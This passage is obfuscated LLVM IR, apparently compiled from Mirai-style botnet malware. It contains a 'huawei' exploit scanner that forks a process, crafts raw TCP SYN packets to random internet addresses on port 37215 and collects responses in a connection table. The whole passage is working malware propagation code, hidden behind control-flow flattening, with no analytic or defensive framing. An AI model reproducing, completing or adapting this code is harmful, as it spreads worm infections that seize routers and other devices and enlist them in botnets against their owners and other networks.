  %28 = getelementptr inbounds [256 x i8], [256 x i8]* %27, i32 0, i32 0
  call void @util_zero(i8* %28, i32 256)
  %29 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %30 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %29, i32 0, i32 0
  %31 = load i32, i32* %30, align 8
  %32 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %33 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %32, i32 0, i32 0
  %34 = load i32, i32* %33, align 8
  %35 = call i32 (i32, i32, ...) @fcntl(i32 %34, i32 3, i32 0)
  %36 = or i32 2048, %35
  %37 = call i32 (i32, i32, ...) @fcntl(i32 %31, i32 4, i32 %36)
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %38, align 4
  %39 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %40 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %39, i32 0, i32 3
  %41 = load i32, i32* %40, align 4
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %43 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %42, i32 0, i32 0
  store i32 %41, i32* %43, align 4
  %44 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %45 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %44, i32 0, i32 4
  %46 = load i16, i16* %45, align 8
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %46, i16* %47, align 2
  %48 = load i32, i32* @exploit_fake_time, align 4
  %49 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %50 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %49, i32 0, i32 1
  store i32 %48, i32* %50, align 4
  %51 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %52 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %51, i32 0, i32 2
  %53 = load i32, i32* %52, align 8
  %54 = icmp eq i32 %53, 3
  %55 = select i1 %54, i32 714063430, i32 1023133583
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %58 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %57, i32 0, i32 2
  %59 = load i32, i32* %58, align 8
  %60 = icmp eq i32 %59, 4
  %61 = select i1 %60, i32 714063430, i32 -71226067
  store i32 %61, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  store i32 -420476553, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %65 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %64, i32 0, i32 2
  store i32 1, i32* %65, align 8
  store i32 -420476553, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %68 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %67, i32 0, i32 0
  %69 = load i32, i32* %68, align 8
  %70 = bitcast %union.__CONST_SOCKADDR_ARG* %4 to %struct.sockaddr**
  %71 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %71, %struct.sockaddr** %70, align 8
  %72 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %4, i32 0, i32 0
  %73 = load %struct.sockaddr*, %struct.sockaddr** %72, align 8
  %74 = call i32 @connect(i32 %69, %struct.sockaddr* %73, i32 16)
  store i32 346194703, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %66, %63, %62, %56, %23, %22, %16, %11, %first, %switchDefault
  br label %loopEntry
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #5

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #2

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #3

; Function Attrs: noinline nounwind uwtable
define i32 @exploit_recv_strip_null(i32, i8*, i32, i32) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  %11 = load i32, i32* %5, align 4
  %12 = load i8*, i8** %6, align 8
  %13 = load i32, i32* %7, align 4
  %14 = sext i32 %13 to i64
  %15 = load i32, i32* %8, align 4
  %16 = call i64 @recv(i32 %11, i8* %12, i64 %14, i32 %15)
  %17 = trunc i64 %16 to i32
  store i32 %17, i32* %9, align 4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1628306842, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1628306842, label %first
    i32 2077834412, label %21
    i32 1637732636, label %22
    i32 486857416, label %27
    i32 -1820858996, label %36
    i32 292276861, label %41
    i32 1244428256, label %42
    i32 2020322614, label %45
    i32 302528032, label %46
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %19 = icmp sgt i32 %.reload, 0
  %20 = select i1 %19, i32 2077834412, i32 302528032
  store i32 %20, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  store i32 0, i32* %10, align 4
  store i32 0, i32* %10, align 4
  store i32 1637732636, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  %23 = load i32, i32* %10, align 4
  %24 = load i32, i32* %9, align 4
  %25 = icmp slt i32 %23, %24
  %26 = select i1 %25, i32 486857416, i32 2020322614
  store i32 %26, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i8*, i8** %6, align 8
  %29 = load i32, i32* %10, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = icmp eq i32 %33, 0
  %35 = select i1 %34, i32 -1820858996, i32 292276861
  store i32 %35, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i8*, i8** %6, align 8
  %38 = load i32, i32* %10, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds i8, i8* %37, i64 %39
  store i8 65, i8* %40, align 1
  store i32 292276861, i32* %switchVar
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  store i32 1244428256, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i32, i32* %10, align 4
  %44 = add nsw i32 %43, 1
  store i32 %44, i32* %10, align 4
  store i32 1637732636, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  store i32 302528032, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i32, i32* %9, align 4
  ret i32 %47

loopEnd:                                          ; preds = %45, %42, %41, %36, %27, %22, %21, %first, %switchDefault
  br label %loopEntry
}

declare i64 @recv(i32, i8*, i64, i32) #5

; Function Attrs: noinline nounwind uwtable
define void @huawei_init() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i16, align 2
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.anon.0*, align 8
  %5 = alloca %struct.fd_set, align 8
  %6 = alloca %struct.fd_set, align 8
  %7 = alloca %struct.exploit_scanner_connection*, align 8
  %8 = alloca %struct.timeval, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.sockaddr_in, align 4
  %15 = alloca %struct.iphdr*, align 8
  %16 = alloca %struct.anon.0*, align 8
  %17 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %18 = alloca i32, align 4
  %19 = alloca [1514 x i8], align 16
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.anon.0*, align 8
  %22 = alloca %struct.exploit_scanner_connection*, align 8
  %23 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %34 = call i32 @fork() #6
  store i32 %34, i32* @huawei_scanner_pid, align 4
  %35 = load i32, i32* @huawei_scanner_pid, align 4
  store i32 %35, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1895616658, i32* %switchVar
  %.reg2mem2 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1895616658, label %first
    i32 -568650614, label %38
    i32 -315595223, label %42
    i32 -101376571, label %43
    i32 -2072401635, label %49
    i32 -2051227200, label %53
    i32 -1258474354, label %64
    i32 1379338519, label %67
    i32 -1463165485, label %71
    i32 1796701226, label %72
    i32 -2032114009, label %83
    i32 1368483684, label %86
    i32 -871350088, label %87
    i32 -870042499, label %91
    i32 -542758968, label %97
    i32 -306047861, label %143
    i32 -1208895773, label %148
    i32 1106882542, label %150
    i32 2092244026, label %154
    i32 -1991072905, label %209
    i32 -592434040, label %212
    i32 -1280701140, label %213
    i32 337538817, label %214
    i32 423415108, label %231
    i32 1791904125, label %236
    i32 705545511, label %241
    i32 1437862166, label %242
    i32 -403548446, label %247
    i32 -1893908249, label %248
    i32 1872472102, label %255
    i32 -2036464194, label %256
    i32 1128248009, label %263
    i32 1724450696, label %264
    i32 -1558123510, label %273
    i32 -276544570, label %274
    i32 -1988428642, label %283
    i32 -581206102, label %284
    i32 -120714611, label %292
    i32 1791567990, label %293
    i32 -531686628, label %301
    i32 1415579010, label %302
    i32 1176358866, label %310
    i32 832457256, label %311
    i32 1537778472, label %319
    i32 1470911834, label %320
    i32 -327747405, label %332
    i32 -1765417572, label %333
    i32 -1901953966, label %335
    i32 -55481979, label %339
    i32 542729120, label %348
    i32 1373408126, label %354
    i32 -435673514, label %355
    i32 1003446946, label %358
    i32 -1166374030, label %362
    i32 -1021552662, label %363
    i32 775885957, label %375
    i32 2130574758, label %376
    i32 -348381098, label %385
    i32 1187809990, label %386
    i32 1836503564, label %395
    i32 -888183147, label %396
    i32 -224512248, label %400
    i32 1126486765, label %410
    i32 875234641, label %419
    i32 1419836331, label %431
    i32 1610192275, label %437
    i32 -856971670, label %443
    i32 2140795735, label %449
    i32 -1558612826, label %471
    i32 1390334045, label %475
    i32 2105535442, label %476
    i32 1897599822, label %482
    i32 -1624003834, label %504
    i32 -458982195, label %508
    i32 -2105481290, label %509
    i32 -1927175277, label %510
    i32 -828592813, label %511
    i32 -1747001684, label %514
    i32 -1638939909, label %521
    i32 1284288329, label %523
    i32 -1866202678, label %525
    i32 1470361564, label %530
    i32 -370703897, label %534
    i32 207064749, label %544
    i32 -2031563416, label %545
    i32 659196393, label %563
    i32 -440046523, label %572
    i32 -1103302605, label %576
    i32 2027771205, label %582
    i32 -477068453, label %607
    i32 1811817089, label %613
    i32 -1746424923, label %622
    i32 -283559082, label %625
    i32 788385367, label %626
    i32 -676895842, label %627
    i32 157213748, label %636
    i32 372221795, label %637
    i32 742881569, label %655
    i32 -117243639, label %656
    i32 -289894261, label %662
    i32 -1962488399, label %663
    i32 1228244991, label %669
    i32 -294263532, label %681
    i32 -1174071328, label %702
    i32 1874222126, label %704
    i32 307098297, label %708
    i32 -1942123129, label %713
    i32 805880920, label %718
    i32 1018458900, label %724
    i32 -923745605, label %730
    i32 1748660154, label %742
    i32 1839863191, label %743
    i32 -875506610, label %761
    i32 -1799417243, label %762
    i32 -1810917463, label %763
    i32 1524889327, label %766
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %36 = icmp sgt i32 %.reload, 0
  %37 = select i1 %36, i32 -315595223, i32 -568650614
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = load i32, i32* @huawei_scanner_pid, align 4
  %40 = icmp eq i32 %39, -1
  %41 = select i1 %40, i32 -315595223, i32 -101376571
  store i32 %41, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  ret void

; <label>:43:                                     ; preds = %loopEntry
  %44 = call i32 @util_local_addr()
  store i32 %44, i32* @LOCAL_ADDR, align 4
  call void @rand_init()
  %45 = call i64 @time(i64* null) #6
  %46 = trunc i64 %45 to i32
  store i32 %46, i32* @huawei_fake_time, align 4
  %47 = call noalias i8* @calloc(i64 128, i64 5416) #6
  %48 = bitcast i8* %47 to %struct.exploit_scanner_connection*
  store %struct.exploit_scanner_connection* %48, %struct.exploit_scanner_connection** @conn_table, align 8
  store i32 0, i32* %1, align 4
  store i32 -2072401635, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %1, align 4
  %51 = icmp slt i32 %50, 128
  %52 = select i1 %51, i32 -2051227200, i32 1379338519
  store i32 %52, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  %54 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %55 = load i32, i32* %1, align 4
  %56 = sext i32 %55 to i64
  %57 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %54, i64 %56
  %58 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %57, i32 0, i32 2
  store i32 0, i32* %58, align 8
  %59 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %60 = load i32, i32* %1, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %59, i64 %61
  %63 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %62, i32 0, i32 0
  store i32 -1, i32* %63, align 8
  store i32 -1258474354, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %65 = load i32, i32* %1, align 4
  %66 = add nsw i32 %65, 1
  store i32 %66, i32* %1, align 4
  store i32 -2072401635, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %68, i32* @huawei_rsck, align 4
  %69 = icmp eq i32 %68, -1
  %70 = select i1 %69, i32 -1463165485, i32 1796701226
  store i32 %70, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  call void @exit(i32 0) #12
  unreachable

; <label>:72:                                     ; preds = %loopEntry
  %73 = load i32, i32* @huawei_rsck, align 4
  %74 = load i32, i32* @huawei_rsck, align 4
  %75 = call i32 (i32, i32, ...) @fcntl(i32 %74, i32 3, i32 0)
  %76 = or i32 2048, %75
  %77 = call i32 (i32, i32, ...) @fcntl(i32 %73, i32 4, i32 %76)
  store i32 1, i32* %1, align 4
  %78 = load i32, i32* @huawei_rsck, align 4
  %79 = bitcast i32* %1 to i8*
  %80 = call i32 @setsockopt(i32 %78, i32 0, i32 3, i8* %79, i32 4) #6
  %81 = icmp ne i32 %80, 0
  %82 = select i1 %81, i32 -2032114009, i32 1368483684
  store i32 %82, i32* %switchVar
  br label %loopEnd

; <label>:83:                                     ; preds = %loopEntry
  %84 = load i32, i32* @huawei_rsck, align 4
  %85 = call i32 @close(i32 %84)
  call void @exit(i32 0) #12
  unreachable

; <label>:86:                                     ; preds = %loopEntry
  store i32 -871350088, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  %88 = call i32 @rand_next()
  %89 = and i32 %88, 65535
  %90 = trunc i32 %89 to i16
  store i16 %90, i16* %2, align 2
  store i32 -870042499, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i16, i16* %2, align 2
  %93 = call zeroext i16 @ntohs(i16 zeroext %92) #9
  %94 = zext i16 %93 to i32
  %95 = icmp slt i32 %94, 1024
  %96 = select i1 %95, i32 -871350088, i32 -542758968
  store i32 %96, i32* %switchVar
  br label %loopEnd

; <label>:97:                                     ; preds = %loopEntry
  store %struct.iphdr* bitcast ([40 x i8]* @huawei_scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %3, align 8
  %98 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %99 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %98, i64 1
  %100 = bitcast %struct.iphdr* %99 to %struct.anon.0*
  store %struct.anon.0* %100, %struct.anon.0** %4, align 8
  %101 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %102 = bitcast %struct.iphdr* %101 to i8*
  %103 = load i8, i8* %102, align 4
  %104 = and i8 %103, -16
  %105 = or i8 %104, 5
  store i8 %105, i8* %102, align 4
  %106 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %107 = bitcast %struct.iphdr* %106 to i8*
  %108 = load i8, i8* %107, align 4
  %109 = and i8 %108, 15
  %110 = or i8 %109, 64
  store i8 %110, i8* %107, align 4
  %111 = call zeroext i16 @htons(i16 zeroext 40) #9
  %112 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %113 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %112, i32 0, i32 2
  store i16 %111, i16* %113, align 2
  %114 = call i32 @rand_next()
  %115 = trunc i32 %114 to i16
  %116 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %117 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %116, i32 0, i32 3
  store i16 %115, i16* %117, align 4
  %118 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %119 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %118, i32 0, i32 5
  store i8 64, i8* %119, align 4
  %120 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %121 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %120, i32 0, i32 6
  store i8 6, i8* %121, align 1
  %122 = call zeroext i16 @htons(i16 zeroext -28321) #9
  %123 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %124 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %123, i32 0, i32 1
  store i16 %122, i16* %124, align 2
  %125 = load i16, i16* %2, align 2
  %126 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %127 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %126, i32 0, i32 0
  store i16 %125, i16* %127, align 4
  %128 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %129 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %128, i32 0, i32 4
  %130 = load i16, i16* %129, align 4
  %131 = and i16 %130, -241
  %132 = or i16 %131, 80
  store i16 %132, i16* %129, align 4
  %133 = call i32 @rand_next()
  %134 = and i32 %133, 65535
  %135 = trunc i32 %134 to i16
  %136 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %137 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %136, i32 0, i32 5
  store i16 %135, i16* %137, align 2
  %138 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %139 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %138, i32 0, i32 4
  %140 = load i16, i16* %139, align 4
  %141 = and i16 %140, -513
  %142 = or i16 %141, 512
  store i16 %142, i16* %139, align 4
  store i32 -306047861, i32* %switchVar
  br label %loopEnd

; <label>:143:                                    ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %144 = load i32, i32* @huawei_fake_time, align 4
  %145 = load i32, i32* %10, align 4
  %146 = icmp ne i32 %144, %145
  %147 = select i1 %146, i32 -1208895773, i32 -1280701140
  store i32 %147, i32* %switchVar
  br label %loopEnd

; <label>:148:                                    ; preds = %loopEntry
  %149 = load i32, i32* @huawei_fake_time, align 4
  store i32 %149, i32* %10, align 4
  store i32 0, i32* %1, align 4
  store i32 1106882542, i32* %switchVar
  br label %loopEnd

; <label>:150:                                    ; preds = %loopEntry
  %151 = load i32, i32* %1, align 4
  %152 = icmp slt i32 %151, 160
  %153 = select i1 %152, i32 2092244026, i32 -592434040
  store i32 %153, i32* %switchVar
  br label %loopEnd

; <label>:154:                                    ; preds = %loopEntry
  %155 = bitcast %struct.sockaddr_in* %14 to i8*
  call void @llvm.memset.p0i8.i64(i8* %155, i8 0, i64 16, i32 4, i1 false)
  store %struct.iphdr* bitcast ([40 x i8]* @huawei_scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %15, align 8
  %156 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %157 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %156, i64 1
  %158 = bitcast %struct.iphdr* %157 to %struct.anon.0*
  store %struct.anon.0* %158, %struct.anon.0** %16, align 8
  %159 = call i32 @rand_next()
  %160 = trunc i32 %159 to i16
  %161 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %162 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %161, i32 0, i32 3
  store i16 %160, i16* %162, align 4
  %163 = load i32, i32* @LOCAL_ADDR, align 4
  %164 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %165 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %164, i32 0, i32 8
  store i32 %163, i32* %165, align 4
  %166 = call i32 @get_random_ip.76()
  %167 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %168 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %167, i32 0, i32 9
  store i32 %166, i32* %168, align 4
  %169 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %170 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %169, i32 0, i32 7
  store i16 0, i16* %170, align 2
  %171 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %172 = bitcast %struct.iphdr* %171 to i16*
  %173 = call zeroext i16 @checksum_generic(i16* %172, i32 20)
  %174 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %175 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %174, i32 0, i32 7
  store i16 %173, i16* %175, align 2
  %176 = call zeroext i16 @htons(i16 zeroext -28321) #9
  %177 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %178 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %177, i32 0, i32 1
  store i16 %176, i16* %178, align 2
  %179 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %180 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %179, i32 0, i32 9
  %181 = load i32, i32* %180, align 4
  %182 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %183 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %182, i32 0, i32 2
  store i32 %181, i32* %183, align 4
  %184 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %185 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %184, i32 0, i32 6
  store i16 0, i16* %185, align 4
  %186 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %187 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %188 = bitcast %struct.anon.0* %187 to i8*
  %189 = call zeroext i16 @htons(i16 zeroext 20) #9
  %190 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %186, i8* %188, i16 zeroext %189, i32 20)
  %191 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %192 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %191, i32 0, i32 6
  store i16 %190, i16* %192, align 4
  %193 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i16 2, i16* %193, align 4
  %194 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %195 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %194, i32 0, i32 9
  %196 = load i32, i32* %195, align 4
  %197 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %198 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %197, i32 0, i32 0
  store i32 %196, i32* %198, align 4
  %199 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %200 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %199, i32 0, i32 1
  %201 = load i16, i16* %200, align 2
  %202 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %201, i16* %202, align 2
  %203 = load i32, i32* @huawei_rsck, align 4
  %204 = bitcast %union.__CONST_SOCKADDR_ARG* %17 to %struct.sockaddr**
  %205 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  store %struct.sockaddr* %205, %struct.sockaddr** %204, align 8
  %206 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %17, i32 0, i32 0
  %207 = load %struct.sockaddr*, %struct.sockaddr** %206, align 8
  %208 = call i64 @sendto(i32 %203, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i32 0, i32 0), i64 40, i32 16384, %struct.sockaddr* %207, i32 16)
  store i32 -1991072905, i32* %switchVar
  br label %loopEnd

; <label>:209:                                    ; preds = %loopEntry
  %210 = load i32, i32* %1, align 4
  %211 = add nsw i32 %210, 1
  store i32 %211, i32* %1, align 4
  store i32 1106882542, i32* %switchVar
  br label %loopEnd

; <label>:212:                                    ; preds = %loopEntry
  store i32 -1280701140, i32* %switchVar
  br label %loopEnd

; <label>:213:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 337538817, i32* %switchVar
  br label %loopEnd

; <label>:214:                                    ; preds = %loopEntry
  store i32 0, i32* %18, align 4
  %215 = getelementptr inbounds [1514 x i8], [1514 x i8]* %19, i32 0, i32 0
  %216 = bitcast i8* %215 to %struct.iphdr*
  store %struct.iphdr* %216, %struct.iphdr** %20, align 8
  %217 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %218 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %217, i64 1
  %219 = bitcast %struct.iphdr* %218 to %struct.anon.0*
  store %struct.anon.0* %219, %struct.anon.0** %21, align 8
  %220 = call i32* @__errno_location() #9
  store i32 0, i32* %220, align 4
  %221 = load i32, i32* @huawei_rsck, align 4
  %222 = getelementptr inbounds [1514 x i8], [1514 x i8]* %19, i32 0, i32 0
  %223 = bitcast %union.__CONST_SOCKADDR_ARG* %23 to %struct.sockaddr**
  store %struct.sockaddr* null, %struct.sockaddr** %223, align 8
  %224 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %23, i32 0, i32 0
  %225 = load %struct.sockaddr*, %struct.sockaddr** %224, align 8
  %226 = call i64 @recvfrom(i32 %221, i8* %222, i64 1514, i32 16384, %struct.sockaddr* %225, i32* null)
  %227 = trunc i64 %226 to i32
  store i32 %227, i32* %18, align 4
  %228 = load i32, i32* %18, align 4
  %229 = icmp sle i32 %228, 0
  %230 = select i1 %229, i32 705545511, i32 423415108
  store i32 %230, i32* %switchVar
  br label %loopEnd

; <label>:231:                                    ; preds = %loopEntry
  %232 = call i32* @__errno_location() #9
  %233 = load i32, i32* %232, align 4
  %234 = icmp eq i32 %233, 11
  %235 = select i1 %234, i32 705545511, i32 1791904125
  store i32 %235, i32* %switchVar
  br label %loopEnd

; <label>:236:                                    ; preds = %loopEntry
  %237 = call i32* @__errno_location() #9
  %238 = load i32, i32* %237, align 4
  %239 = icmp eq i32 %238, 11
  %240 = select i1 %239, i32 705545511, i32 1437862166
  store i32 %240, i32* %switchVar
  br label %loopEnd

; <label>:241:                                    ; preds = %loopEntry
  store i32 775885957, i32* %switchVar
  br label %loopEnd

; <label>:242:                                    ; preds = %loopEntry
  %243 = load i32, i32* %18, align 4
  %244 = sext i32 %243 to i64
  %245 = icmp ult i64 %244, 40
  %246 = select i1 %245, i32 -403548446, i32 -1893908249
  store i32 %246, i32* %switchVar
  br label %loopEnd

; <label>:247:                                    ; preds = %loopEntry
  store i32 337538817, i32* %switchVar
  br label %loopEnd

; <label>:248:                                    ; preds = %loopEntry
  %249 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %250 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %249, i32 0, i32 9
  %251 = load i32, i32* %250, align 4
  %252 = load i32, i32* @LOCAL_ADDR, align 4
  %253 = icmp ne i32 %251, %252
  %254 = select i1 %253, i32 1872472102, i32 -2036464194
  store i32 %254, i32* %switchVar
  br label %loopEnd

; <label>:255:                                    ; preds = %loopEntry
  store i32 337538817, i32* %switchVar
  br label %loopEnd

